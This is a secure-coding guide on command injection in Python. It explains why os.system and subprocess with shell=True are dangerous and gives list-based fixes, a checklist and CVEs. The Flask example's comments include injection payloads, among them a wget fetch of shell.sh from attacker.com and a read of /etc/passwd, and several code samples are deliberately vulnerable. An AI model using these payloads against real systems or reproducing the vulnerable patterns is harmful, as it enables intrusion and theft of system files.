# Command Injection — Python

> **Severity:** Critical
> **CVSS:** 9.8 (Critical)
> **AI Generation Risk:** Very High — AI models frequently use os.system() and subprocess with shell=True

---

## Vulnerability Explanation

Command injection occurs when user-controlled input is passed unsafely to operating system commands. In Python, the danger centers on three primary API patterns:

1. **`os.system()`** — Executes a shell command via the system shell
2. **`subprocess` with `shell=True`** — Runs command through `/bin/sh -c`
3. **`os.popen()`** — Opens a pipe to/from a shell command

**The core issue:** When `shell=True` is used, arguments are interpreted by the shell, not passed as literal arguments. Shell metacharacters (`;`, `|`, `&&`, `` ` ``, `$()`) allow command chaining.

### How Shell Injection Works

```python
import os

# User provides: example.com; cat /etc/passwd
hostname = "example.com; cat /etc/passwd"
os.system(f"ping -c 1 {hostname}")  # 💥 Executes: ping -c 1 example.com; cat /etc/passwd
```

The shell interprets `;` as a command separator and executes both commands.

---

## How AI / Vibe Coding Generates This

### 1. os.system() for "Simple" Commands

```python
# 🚫 VULNERABLE — AI-generated system administration
import os

def ping_host(host):
    # AI reaches for os.system() — easiest path
    response = os.system(f"ping -c 4 {host}")  # 💥
    return response == 0
```

### 2. subprocess with shell=True

```python
# 🚫 VULNERABLE — AI-generated subprocess call
import subprocess

def run_command(cmd):
    # AI uses shell=True for piping/redirection
    result = subprocess.run(
        cmd, 
        shell=True,  # 💥 Shell injection
        capture_output=True,
        text=True
    )
    return result.stdout
```

### 3. curl/wget for Download Functions

```python
# 🚫 VULNERABLE — AI-generated download helper
import subprocess

def download_file(url, output_path):
    # AI constructs curl command with user input
    cmd = f"curl -o {output_path} {url}"  # 💥
    subprocess.run(cmd, shell=True)
```

### 4. Image/Video Processing with User Input

```python
# 🚫 VULNERABLE — AI-generated media processing
import subprocess

def convert_video(input_file, output_format):
    cmd = f"ffmpeg -i {input_file} -f {output_format} output.{output_format}"  # 💥
    subprocess.run(cmd, shell=True)
```

### 5. Git Operations in AI-Generated DevOps Scripts

```python
# 🚫 VULNERABLE — AI-generated git automation
import subprocess

def checkout_branch(branch_name):
    subprocess.run(f"git checkout {branch_name}", shell=True)  # 💥
```

### Why AI Does This

- **`os.system()` and `subprocess(shell=True)` are 1-liners:** AI optimizes for brevity
- **Shell features are assumed needed:** Pipes, redirects, and env vars make `shell=True` seem necessary
- **No token economy for security:** The AI has finite token output; adding shell escaping costs tokens
- **Command execution patterns are overrepresented:** Tutorials use `os.system()` extensively

---

## Vulnerable Code Example

### Flask Command Runner

```python
# 🚫 VULNERABLE — AI-generated command executor
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/ping')
def ping():
    target = request.args.get('target')
    # Attacker sends: target=google.com;cat /etc/passwd
    result = subprocess.run(
        f"ping -c 3 {target}",
        shell=True,
        capture_output=True,
        text=True
    )
    return f"<pre>{result.stdout}</pre>"

# Exploitation:
# /ping?target=google.com;id
# /ping?target=$(cat /etc/passwd | base64)
# /ping?target=127.0.0.1;wget http://attacker.com/shell.sh
```

### shlex.quote() Pitfall

```python
# ⚠️ ALSO VULNERABLE — AI using shlex.quote() incorrectly
import shlex
import subprocess

def ping_host(host):
    # AI thinks shlex.quote() makes it safe with shell=True
    safe_host = shlex.quote(host)
    result = subprocess.run(
        f"ping -c 3 {safe_host}",
        shell=True,  # 💥 Still dangerous — shell=True is the root cause
        capture_output=True
    )
    return result.stdout
```

**Why this still fails:** `shlex.quote()` wraps input in single quotes, but `shell=True` can still be vulnerable to injection through other parts of the command string, and `shlex.quote()` has edge cases on Windows and with certain Unicode inputs.

---

## Secure Code Fix

### Fix 1: Use subprocess Without shell=True (Best Practice)

```python
# ✅ SAFE — subprocess with list arguments, no shell
import subprocess

def ping_host(host):
    result = subprocess.run(
        ["ping", "-c", "3", host],  # Arguments as list — no shell involved
        capture_output=True,
        text=True
    )
    return result.stdout
```

### Fix 2: Replace os.system() with subprocess

```python
# 🚫 VULNERABLE
os.system(f"ping -c 1 {host}")

# ✅ SAFE
subprocess.run(["ping", "-c", "1", host])
```

### Fix 3: For Commands That Need Shell Features

```python
# ✅ SAFE — Use subprocess with pipes connected manually
import subprocess

# Instead of: subprocess.run("ps aux | grep python", shell=True)
p1 = subprocess.Popen(["ps", "aux"], stdout=subprocess.PIPE)
p2 = subprocess.Popen(["grep", "python"], stdin=p1.stdout, stdout=subprocess.PIPE)
p1.stdout.close()  # Allow p1 to receive SIGPIPE
output = p2.communicate()[0]
```

### Fix 4: Safe ffmpeg / Media Processing

```python
# ✅ SAFE — Pass arguments as list
import subprocess

def convert_video(input_file, output_format):
    # Never trust output_format either — validate it
    VALID_FORMATS = {'mp4', 'avi', 'mkv', 'webm'}
    if output_format not in VALID_FORMATS:
        raise ValueError(f"Invalid format: {output_format}")
    
    subprocess.run([
        "ffmpeg", "-i", input_file,
        "-f", output_format,
        f"output.{output_format}"
    ])
```

### Fix 5: For Hostname/IP Validation

```python
# ✅ SAFE — Validate input domain/ip before command execution
import re
import subprocess

def ping_host(host):
    # Validate hostname format before passing to command
    HOSTNAME_RE = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9\-\.]*[a-zA-Z0-9])?$')
    if not HOSTNAME_RE.match(host):
        raise ValueError(f"Invalid hostname: {host}")
    
    result = subprocess.run(
        ["ping", "-c", "3", host],
        capture_output=True,
        text=True,
        timeout=30
    )
    return result.stdout
```

---

## Prevention Checklist

- [ ] NEVER use `shell=True` in `subprocess` calls with user input
- [ ] NEVER use `os.system()` with any external input
- [ ] ALWAYS pass command arguments as a **list**, not a string
- [ ] Use `subprocess.run()` with `shell=False` (default) — never omit this
- [ ] Validate/normalize all user input before any command execution
- [ ] Prefer Python libraries over shell commands (e.g., `shutil` over `cp`, `paramiko` over `ssh`)
- [ ] Set `timeout` on all subprocess calls to prevent DoS
- [ ] Use `shlex.split()` to parse command strings into lists (NOT security — only parsing)
- [ ] Run commands with least privilege (avoid root/sudo in subprocess)
- [ ] Restrict allowed commands via a whitelist when command execution is required
- [ ] Use containerization/sandboxing for any code that executes commands

---

## Real-World CVEs

| CVE | Description | Impact |
|---|---|---|
| **CVE-2020-16846** | SaltStack Salt ≤3002 — unauthenticated shell injection in the salt-api SSH client (params like `ssh_options` passed to a shell string) | Unauthenticated RCE |
| **CVE-2022-24439** | GitPython <3.1.30 — argument injection via a crafted `ext::sh -c ...` clone URL passed to `git` | RCE |
| **CVE-2022-24065** | cookiecutter <2.1.1 — command injection via the `checkout` parameter (Mercurial `hg` argument injection) | RCE |
| **CVE-2020-11981** | Apache Airflow ≤1.10.10 — CeleryExecutor runs unsanitized commands taken from the message broker | Worker RCE |
| **CVE-2024-45595** | D-Tale <3.14.1 — arbitrary OS command execution via the Chart Builder "Custom Filter" input | RCE |

---

## Vibe Coding Red Flags

In AI-generated Python, flag these immediately:

```python
os.system(f"...{user_input}...")        # 💥 Classic
subprocess.run(f"...{user_input}...", shell=True)  # 💥 Shell=True
subprocess.Popen(f"...{user_input}...", shell=True)  # 💥 Shell=True
os.popen(f"...{user_input}...")          # 💥 Deprecated, still dangerous
commands.getoutput(f"...{user_input}...") # 💥 Python 2, but still seen
check_output(f"...{user_input}...", shell=True)  # 💥 check_output shell
```

> **Golden Rule:** If `shell=True` appears in any subprocess call with even a hint of external input, it's a critical vulnerability. Replace with list-based arguments immediately.
